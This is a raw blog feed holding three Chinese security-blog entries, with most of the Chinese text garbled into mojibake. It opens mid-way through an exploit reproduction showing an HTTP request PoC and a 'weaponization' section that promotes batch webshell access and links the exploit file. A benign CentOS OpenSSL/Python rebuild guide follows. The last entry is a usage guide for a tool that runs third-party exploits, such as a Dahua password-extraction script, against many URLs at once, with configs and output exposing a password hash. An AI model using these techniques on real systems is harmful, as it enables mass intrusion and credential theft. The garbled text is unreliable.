xxxxxxxxxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">49</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedfile<span class="token operator">=</span>idididi <span class="token comment">//è¿™é‡Œä¹Ÿå¯ä»¥åŠ åˆ°å¹²æ‰°å­—ç¬¦ä¾‹å¦‚username=admin&amp;password=admin&amp;file=dfdsfdsfdsf&amp;type=login</span>HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> OK<span class="token class-name">Date</span><span class="token operator">:</span> <span class="token class-name">Sat</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token class-name">Mar</span> <span class="token number">2024</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">:</span><span class="token number">39</span> GMT<span class="token class-name">Server</span><span class="token operator">:</span> <span class="token class-name">Apache</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> <span class="token keyword">private</span><span class="token class-name">Vary</span><span class="token operator">:</span> <span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>json<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">145</span>è¿”å›è¿™ä¸ª no_file æ‰æ˜¯å¯¹çš„å…¶ä»–éƒ½æ˜¯é”™è¯¯çš„<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token operator">:</span><span class="token string">"no_file"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token operator">:</span><span class="token string">"\u6ce8\u518c\u6587\u4ef6\u4e0d\u5b58\u5728"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"runtime"</span><span class="token operator">:</span><span class="token string">"0.322"</span><span class="token punctuation">&#125;</span>è¿™é‡Œæ˜¯å›æ˜¾ç»“æœ</code></pre><p>æˆªå›¾æˆ‘å°±ä¸æˆªäº†åŸºæœ¬å°±æ˜¯ä¸Šé¢çš„æ­¥éª¤</p><h2 id="å¤ç°å‘ç‚¹"><a href="#å¤ç°å‘ç‚¹" class="headerlink" title="å¤ç°å‘ç‚¹"></a>å¤ç°å‘ç‚¹</h2><p> åœ¨brup é«˜ç‰ˆæœ¬ä¸­å³ä½¿ä½ ç”¨æ­£ç¡®pocä¹Ÿæ— æ³•å¤ç°æˆåŠŸä¸‹å›¾è¯´æ˜ã€‚ä¸‹å›¾æœ€æ–°ç‰ˆæœ¬çš„brupå¤ç°å¤±è´¥ç”¨çš„pocæ˜¯åŒä¸€ä¸ªconten-length éƒ½ä¸ä¸€æ ·<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301627884.png" alt="å¤ç°å‘ç‚¹"><br> è¿™ä¸ªæˆªå›¾æˆªä¸€ä¸ªæˆåŠŸçš„<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301631579.png" alt="æˆåŠŸå¤ç°"></p><h2 id="æ­¦å™¨åŒ–"><a href="#æ­¦å™¨åŒ–" class="headerlink" title="æ­¦å™¨åŒ–"></a>æ­¦å™¨åŒ–</h2><p>è¿™æ ·é‡å¤çš„åŠ³åŠ¨æ¯”è¾ƒè¾›è‹¦æˆ‘ä»¬åšæˆä¸€ä¸ªè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ­¦å™¨ã€‚å¦å¤–å¦‚æœä½ ä¸æƒ³å†™ä»£ç å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„å·¥å…·5.3æœ€æ–°ç‰ˆæœ¬ inié…ç½®æ¨¡å¼é…ç½®ä¸€æ³¢åˆ«äººå†™å¥½çš„è„šæœ¬ç›´æ¥æ‰¹é‡æ‹¿shellå°±è¡Œè‡³äºå¦‚ä½•é…ç½®å‚è€ƒå‰é¢çš„ä¸œä¸œã€‚è¿™ä¸ªæ¼æ´å¦‚æœåªæä¸€ä¸ªå‘½ä»¤æ‰§è¡Œä¸å¤ªè¡Œã€‚ç»è¿‡æˆ‘çš„ç ”ç©¶ç ”ç©¶å‡ºä¸€ä¸ªç›´æ¥å¯ä»¥getshellçš„expé…ç½®å‘½ä»¤æ‰§è¡Œã€‚<br>ã€‚å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301634001.jpg" alt="!æ­¦å™¨åŒ–"><br>ä¸Šè¿°å¯ä»¥å•ä¸ªä¹Ÿå¯ä»¥æ‰¹é‡getshellã€‚è¾¾åˆ°å¿«é€Ÿæ‹¿webshellçš„ç›®çš„ã€‚é‚£äº›ç°åœ¨æä¸€æ³¢å°å¯†åœˆå†™ä¸ªpyæˆ–è€…goçš„è¿™äº›å•ä¸ªçš„å‘½ä»¤è¡Œæ‰§è¡Œçš„å°±åˆ«è€ç”¨å°å¯†åœˆå‰²éŸ­èœäº†å¥½æ­¹ä½ æ”¾ä¸€æ³¢ä½ æ„é€ çš„.pharæ–‡ä»¶ã€‚è€åœ¨é‚£è£…é€¼æˆ‘ä¹Ÿæ˜¯é†‰äº†ã€‚ã€‚ã€‚ã€‚è‡³äºexpçš„æ„é€ å‚è€ƒé˜¿é‡Œäº‘é‚£ç¯‡æ–‡ç« ä½ å°±å¯ä»¥è‡ªå·±æ„é€ äº†æ€ä¹ˆæ ·ã€‚</p><h2 id="æ„é€ æ–‡ä»¶ä¸‹è½½"><a href="#æ„é€ æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ„é€ æ–‡ä»¶ä¸‹è½½"></a>æ„é€ æ–‡ä»¶ä¸‹è½½</h2><p>æˆ‘æ”¾åˆ°é¢‘é“è¯„è®ºåŒºäº†è‡ªå·±ä¸‹è½½å§<br><a href="https://t.me/SoftwareNoticeChannel/401?comment=10602">https://t.me/SoftwareNoticeChannel/401?comment=10602</a><br/><br>githubåœ°å€:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Centos python3è¯·æ±‚httpsç±»å‹ç½‘ç«™æŠ¥é”™é—®é¢˜è§£å†³-æŠ¥é”™åŸå› opensslç‰ˆæœ¬è¿‡ä½</title>
      <link href="/problemsolved/2024/03/articles/b21057b89a7d1481/"/>
      <url>/problemsolved/2024/03/articles/b21057b89a7d1481/</url>
      
        <content type="html"><![CDATA[<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><h2>åœ¨linux centos ä¸Šè¿è¡Œpythonè„šæœ¬å‡ºç°é”™è¯¯é”™è¯¯</h2><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/requests/adapters.py"</span><span class="token punctuation">,</span> line <span class="token number">486</span><span class="token punctuation">,</span> <span class="token keyword">in</span> send    resp <span class="token operator">=</span> conn<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/urllib3/connectionpool.py"</span><span class="token punctuation">,</span> line <span class="token number">755</span><span class="token punctuation">,</span> <span class="token keyword">in</span> urlopen    retries <span class="token operator">=</span> retries<span class="token punctuation">.</span>increment<span class="token punctuation">(</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/urllib3/util/retry.py"</span><span class="token punctuation">,</span> line <span class="token number">573</span><span class="token punctuation">,</span> <span class="token keyword">in</span> increment    <span class="token keyword">raise</span> MaxRetryError<span class="token punctuation">(</span>_pool<span class="token punctuation">,</span> url<span class="token punctuation">,</span> error <span class="token keyword">or</span> ResponseError<span class="token punctuation">(</span>cause<span class="token punctuation">)</span><span class="token punctuation">)</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>MaxRetryError<span class="token punctuation">:</span> HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'xxxxxxxxx'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Max retries exceeded <span class="token keyword">with</span> url<span class="token punctuation">:</span> <span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>html <span class="token punctuation">(</span>Caused by SSLError<span class="token punctuation">(</span>SSLError<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'[SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocol version (_ssl.c:1108)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>During handling of the above exception<span class="token punctuation">,</span> another exception occurred<span class="token punctuation">:</span></code></pre><h2 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h2><p>é¦–å…ˆå®‰è£…ä¾èµ–</p><pre class="language-sh" data-language="sh"><code class="language-sh">yum install zlib zlib-devel bzip2-devel openssl-devel ncurses-devel libuuid-devel sqlite-devel readline-devel tcl-devel tk-devel lzma gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211557212.png" alt="ä¾èµ–å®‰è£…"></p><p>ä¸‹è½½opensslæºä»£ç <br>wget <a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211558140.png" alt="ä¸‹è½½opensslæºç "></p><p>è§£å‹<br>    tar zxf openssl-1.1.1g.tar.gz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211600372.png" alt="è§£å‹"></p><p>é…ç½®ç¼–è¯‘opensslç¯å¢ƒ<br>.&#x2F;config â€“prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl shared zlib<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211601287.png" alt="é…ç½®opensslç¼–è¯‘ç¯å¢ƒ"><br>makeç¼–è¯‘<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211607251.png" alt="make"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211607721.png" alt="makeç¼–è¯‘"><br>make installå®‰è£…<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211608603.png" alt="make install"><br>åˆ›å»ºè½¯é“¾æ¥<br>ln -sf &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;openssl<br>ln -s &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib&#x2F;libssl.so.1.1 &#x2F;usr&#x2F;lib64&#x2F;libssl.so.1.1<br>ln -s &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib&#x2F;libcrypto.so.1.1 &#x2F;usr&#x2F;lib64&#x2F;libcrypto.so.1.1<br>openssl version<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211610783.png" alt="æŸ¥çœ‹å®‰è£…çš„opensslæ˜¯å¦æˆåŠŸ"><br>å®‰è£…æˆåŠŸä»¥åä¸‹è½½pythonæºç <br>wget <a href="https://www.python.org/ftp/python/3.8.6/Python-3.8.6.tgz">https://www.python.org/ftp/python/3.8.6/Python-3.8.6.tgz</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211611279.png" alt="ä¸‹è½½pythonæºç "><br>è§£å‹ tar zxf Python-3.8.6.tgz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211611486.png" alt="è§£å‹python"><br>é‡ç‚¹é“¾æ¥ openssl  è®¾ç½®ç¼–è¯‘ç¯å¢ƒ<br>.&#x2F;configure â€“prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;python3 â€“with-openssl&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211612421.png" alt="ç¼–è¯‘"><br>makeç¼–è¯‘<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211614542.png" alt="make"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211614928.png" alt="make"><br>make install<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211615045.png" alt="make install"></p><p>python3å†æ¬¡æµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211621486.png" alt="æµ‹è¯•python3"></p><p>æœ€ç»ˆæµ‹è¯•æµ‹è¯•è„šæœ¬æƒ…å†µæ­£å¸¸è¿è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211624440.png" alt="æµ‹è¯•é—®é¢˜æ˜¯å¦è§£å†³"></p><p>å¦‚æœä¸Šè¿°å·²ç»å®‰è£…äº†requests æŠ¥é”™è¯´æ˜¯requestsè¿˜æŠ¥é”™å°è¯•<br>æœ€å¥½æŠŠpythonåŠ å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­(å¦‚æœä¸Šè¿°æ­¥éª¤imports requests æ‰¾ä¸åˆ°é‚£å¯ä»¥è¯•è¯•åŠ å…¥åˆ°ç¯å¢ƒå˜é‡)</p><p>export PATH&#x3D;â€&#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin:$PATHâ€<br>vim &#x2F;etc&#x2F;profile<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211622067.png"><br>ä¿®æ”¹å®Œæ¯•ä»¥åsource &#x2F;etc&#x2F;pfofileä¸€ä¸‹å¼„å®Œä»¥åå†æ¬¡å°è¯•çœ‹çœ‹ã€‚å¦‚æœä¸è¡Œåˆ é™¤åœ¨é‡æ–°ç¼–è¯‘çœ‹çœ‹é—æ¼äº†å“ªäº›ç»†èŠ‚ã€‚æµ‹è¯•åœ¨linux<br>CentOS Linux release 7.9.2009 (Core)  3.10.0-1160.102.1.el7.x86_64 #1 SMP Tue Oct 17 15:42:21 UTC 2023 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p>]]></content>
      
      
      <categories>
          
          <category> ProblemSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ToolDevelopment </tag>
            
            <tag> ALLlanguage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»¼åˆæ€§exp|pocæ¸—é€å·¥å…·-WebFrameworkTools5.2 inié…ç½®ç”¨æ³•</title>
      <link href="/securitytools/2024/01/articles/1fee187af88e0843/"/>
      <url>/securitytools/2024/01/articles/1fee187af88e0843/</url>
      
        <content type="html"><![CDATA[<h1 id="è½¯ä»¶ç”¨æ³•"><a href="#è½¯ä»¶ç”¨æ³•" class="headerlink" title="è½¯ä»¶ç”¨æ³•"></a>è½¯ä»¶ç”¨æ³•</h1><h2>WebFrameworkTools5.2 iniå·¥å…·ä½¿ç”¨æ–¹æ³•</h2> åœ¨23å¹´8æœˆä»½å·²ç»å‘å¸ƒäº†5.1 è¯¦æƒ…è¯·çœ‹https://peiqif4ck.github.io/securitytools/2023/08/articles/17280a163317a771/  å¹¶ä¸”ä¹Ÿå†™æ˜äº†ç”¨æ³• è¯¦æƒ…è¯·çœ‹https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/   ä¸ºä»€ä¹ˆè¦å¼€å‘è¿™ä¸ªè½¯ä»¶å‘¢æœ‰äº›äººè¯´ä½ è™½ç„¶æä¾›äº†ç¼–å†™expçš„æ•™ç¨‹è¿˜æœ‰ä¸€é”®ç”Ÿæˆåˆ©ç”¨expçš„å›¾å½¢åŒ–çš„å·¥å…·ã€‚ä½†æ˜¯æˆ‘å°±ä¸ä¸å–œæ¬¢è‡ªå·±å†™expã€‚æˆ‘èƒ½ä¸åˆ©ç”¨githubæˆ–è€…å“ªé‡Œå†™å¥½çš„expç›´æ¥æ‰¹é‡å¤šæ ·åŒ–<br/> ä¾‹å¦‚:æœ‰ä¸€ä¸ªæ¼æ´åˆ©ç”¨expæ˜¯pythonå†™çš„æ¯”å¦‚å¤§åä»»æ„æ–‡ä»¶è¯»å–è¿˜æœ‰ä¸€ä¸ªæ˜¯expæ˜¯ goå†™çš„ é€šè¾¾oaä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„expã€‚ç­‰ç­‰æ¼æ´åˆ©ç”¨expã€‚å‡å¦‚æœ‰100ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åº æˆ‘ä»¬æœ‰100ä¸ªç½‘ç«™å¹¶ä¸”è¿™100ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åºæˆ‘ä»¬éœ€è¦è¿è¡Œ100æ¬¡è¿™ç§ä¸‹æ¬¡åˆ©ç”¨çš„æ—¶å€™åˆè¦è¿è¡Œ100æ¬¡ã€‚æœ‰æ²¡æœ‰åªé…ç½®100æ¬¡æŠŠè¿™100ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åºæ”¾åˆ°å›ºå®šä½ç½®å¹¶ä¸”å¯¹åº”100ä¸ªé…ç½®æ–‡ä»¶è¿™æ ·é…ç½®å¥½æˆ‘ä»¬åªè¦è¿è¡Œç¨‹åºä¸€æ¬¡å¹¶ä¸”è£…è½½100ä¸ªurlå°±å¯ä»¥æ‰¹é‡åˆ©ç”¨ã€‚å¹¶ä¸”åªéœ€è¦æ¢urlå°±è¡Œäº†ã€‚è¿™æ ·å°±å¯ä»¥åå¤åˆ©ç”¨äº†ã€‚è¿™å°±æ˜¯è¿™ä¸ªå·¥å…·çš„ä»·å€¼æ‰€åœ¨ã€‚è¿™å°±æ˜¯å¼€å‘è¿™ä¸ªå·¥å…·çš„å¿…è¦ã€‚<br/> å·¥å…·ç”¨æ³•:<ul><li>WebFrameworkToolsUserIni.exe</li><li>WebFrameworkToolsUserIni.exe -thread 30</li><li>WebFrameworkToolsUserIni.exe -ininame test.ini</li><li>WebFrameworkToolsUserIni.exe -ininame test.ini -thread 30</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com -thread 30</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com -ininame test.ini</li></ul><h2 id="å·¥å…·ç•Œé¢"><a href="#å·¥å…·ç•Œé¢" class="headerlink" title="å·¥å…·ç•Œé¢"></a>å·¥å…·ç•Œé¢</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301538031.png" alt="è½¯ä»¶ç•Œé¢"></p><h2 id="å·¥å…·è¯¦ç»†ä½¿ç”¨"><a href="#å·¥å…·è¯¦ç»†ä½¿ç”¨" class="headerlink" title="å·¥å…·è¯¦ç»†ä½¿ç”¨"></a>å·¥å…·è¯¦ç»†ä½¿ç”¨</h2><p> å‡å¦‚ç°åœ¨æœ‰ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åºDahua_getpass_scan.py å¹¶ä¸”è¿™ä¸ªå·¥å…·æœ‰å•ä¸ªurl ç”¨æ³• :python3 Dahua_systempass_scan.py -u <a href="http://ip:port">http://ip:port</a> æˆ‘ä»¬å°±ç”¨è¿™ä¸ªä¸¾ä¾‹å­æŠŠé¦–å…ˆç¡®ä¿è¿™ä¸ªè„šæœ¬å¯ä»¥ä½¿ç”¨å¦‚å›¾: 2.png</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301605535.png" alt="åˆ©ç”¨å·¥å…·æˆªå›¾æ¼”ç¤º"></p><p>è¿è¡Œç»“æœ<br> [32m[+]<a href="https://xxxxxs/">https://xxxxxs</a> is vulnerable. system:d02e1040073667ee666afdab17c88df6[0m<br>æˆ‘ä»¬é…ç½®ä¸€ä¸‹é…ç½®æ¨¡ç‰ˆå¦‚ä¸‹:</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">WebTools</span><span class="token punctuation">]</span></span><span class="token comment">#è¿™é‡Œå¯ä»¥åœ¨cmdé‡Œé¢æ‰§è¡Œæ— éœ€é…ç½®ç»å¯¹è·¯å¾„å¦åˆ™éœ€é…ç½®ç»å¯¹è·¯å¾„</span><span class="token key attr-name">exe</span><span class="token punctuation">=</span><span class="token value attr-value">python</span><span class="token comment">#è¿™é‡Œæ˜¯æ‰§è¡Œè„šæœ¬çš„å‚æ•° è¿™é‡Œçš„pythonæ˜¯ä¸ªæ–‡ä»¶å¤¹é‡Œé¢æ”¾çš„è¿™ä¸ªDahua_getpass_scan.py</span><span class="token key attr-name">arg</span><span class="token punctuation">=</span><span class="token value attr-value">python\Dahua_getpass_scan.py -u $url$</span><span class="token comment">#æ¼æ´ç‰¹å¾å­—ç¬¦ä¸²åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²å°±æœ‰æ¼æ´</span><span class="token key attr-name">vulStr</span><span class="token punctuation">=</span><span class="token value attr-value">is vulnerable</span><span class="token comment">#æ­£åˆ™è¡¨è¾¾å¼æå–å­—ç¬¦ä¸²è¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯å®šä½åœ¨(?&lt;=\[\+\])å®šä½[+] é…ç½®è§„åˆ™æ˜¯ .*æ‰€ä»¥å°±åŒ¹é…åˆ°äº† https://xxxxxs is vulnerable. system:d02e1040073667ee666afdab17c88df6[0m</span><span class="token key attr-name">regex</span><span class="token punctuation">=</span><span class="token value attr-value">(?&lt;=\[\+\]).*</span><span class="token comment">#é…ç½®ä¸è¾“å‡ºç¨‹åºæ‰§è¡Œçš„æ‰€æœ‰ç»“æœåªè¾“å‡ºæ­£åˆ™ç»“æœç­‰</span><span class="token key attr-name">echoAllResult</span><span class="token punctuation">=</span><span class="token value attr-value">no</span><span class="token comment">#é…ç½®æ˜¯å¦éœ€è¦æœ¬ç¨‹åºå†™å…¥ç»“æœå¦‚æœä¸éœ€è¦ç¨‹åºå†™å…¥é‚£ä¹ˆå°±æ˜¯no</span><span class="token key attr-name">writeFile</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#é…ç½®ä¸åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²æœ‰æ¼æ´æ³¨æ„vulStrå’ŒNovulSträ¸èƒ½åŒæ—¶å‡ºç°åœ¨åŒä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­</span><span class="token comment">#NovulStr</span></code></pre><p>åœ¨ç¨‹åºåŒéšä¾¿ç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å«python æŠŠåˆ©ç”¨ç¨‹åºæ”¾åˆ°é‡Œé¢å¦‚ä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301606838.png" alt="æ¼æ´åˆ©ç”¨ç¨‹åº"><br>æˆ‘ä»¬æ¥é…ç½®ä¸€ä¸‹æˆ‘ä»¬çš„iniæ–‡ä»¶ é…ç½®å¦‚ä¸‹:</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">WebTools</span><span class="token punctuation">]</span></span><span class="token comment">#è¿™é‡Œå¯ä»¥åœ¨cmdé‡Œé¢æ‰§è¡Œæ— éœ€é…ç½®ç»å¯¹è·¯å¾„å¦åˆ™éœ€é…ç½®ç»å¯¹è·¯å¾„</span><span class="token key attr-name">exe</span><span class="token punctuation">=</span><span class="token value attr-value">python</span><span class="token comment">#è¿™é‡Œæ˜¯æ‰§è¡Œè„šæœ¬çš„å‚æ•°</span><span class="token key attr-name">arg</span><span class="token punctuation">=</span><span class="token value attr-value">python\Dahua_getpass_scan.py -u $url$</span><span class="token comment">#æ¼æ´ç‰¹å¾å­—ç¬¦ä¸²åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²å°±æœ‰æ¼æ´</span><span class="token key attr-name">vulStr</span><span class="token punctuation">=</span><span class="token value attr-value">is vulnerable</span><span class="token comment">#æ­£åˆ™è¡¨è¾¾å¼æå–å­—ç¬¦ä¸²</span><span class="token key attr-name">regex</span><span class="token punctuation">=</span><span class="token value attr-value">(?&lt;=\[\+\]).*</span><span class="token comment">#é…ç½®ä¸è¾“å‡ºç¨‹åºæ‰§è¡Œçš„æ‰€æœ‰ç»“æœåªè¾“å‡ºæ­£åˆ™ç»“æœç­‰</span><span class="token key attr-name">echoAllResult</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#é…ç½®æ˜¯å¦éœ€è¦æœ¬ç¨‹åºå†™å…¥ç»“æœ</span><span class="token key attr-name">writeFile</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#é…ç½®ä¸åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²æœ‰æ¼æ´æ³¨æ„vulStrå’ŒNovulSträ¸èƒ½åŒæ—¶å‡ºç°åœ¨åŒä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­</span><span class="token comment">#NovulStr</span></code></pre><p>å¦‚ä¸‹å›¾: </p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301607402.png" alt="ç¨‹åºåˆ©ç”¨é…ç½®æˆªå›¾"></p><p>åˆ©ç”¨æˆªå›¾<br>WebFrameworkToolsUserIni.exe -url xxxx.com -ininame dahua.ini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301608737.png" alt="ç¨‹åºåˆ©ç”¨æˆªå›¾"></p><p>å¦‚æœæƒ³æ‰¹é‡æ‰§è¡Œé‚£ä¹ˆåˆ›å»ºä¸€ä¸ªiniUrl.txt ä¸€è¡Œä¸€ä¸ªæˆªå›¾</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301609767.png" alt="iniUrlæˆªå›¾"></p><p>åˆ©ç”¨æˆªå›¾<br>WebFrameworkToolsUserIni.exe -ininame dahua.ini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301611246.png" alt="åˆ©ç”¨æˆªå›¾"></p><p>å¦‚æœæƒ³æ‰¹é‡url æ‰¹é‡é…ç½®æ–‡ä»¶ æˆªå›¾  éœ€è¦åŒç›®å½•ä¸‹åˆ›å»ºconfigini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301612869.png" alt="configinié…ç½®ç›®å½•"></p><p>åˆ©ç”¨æˆªå›¾<br>WebFrameworkToolsUserIni.exe -url <a href="https://xxxxxx/">https://xxxxxx</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301612717.png" alt="åˆ©ç”¨æˆªå›¾"></p><p>åˆ©ç”¨æˆªå›¾ æ‰¹é‡ç½‘ç«™ 10.png<br>WebFrameworkToolsUserIni.exe</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301613515.png" alt="æ‰¹é‡ç½‘ç«™åˆ©ç”¨æˆªå›¾"></p><p>é…ç½®æˆªå›¾ 11.png</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301614261.png" alt="é…ç½®æˆªå›¾"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p> ä¸Šè¿°å°±æ˜¯ä½¿ç”¨æ–¹å¼è¿™ä¸ªæ˜¯é…ç½®æ–‡ä»¶æ¯”è¾ƒéš¾æå¯èƒ½éœ€è¦æ­£åˆ™è¡¨è¾¾å¼è¿™ä¸ªã€‚å¦‚æœä¸ä¼šé…ç½®å¯ä»¥é—®ä¸€æ³¢chatgtã€‚<br/><br> 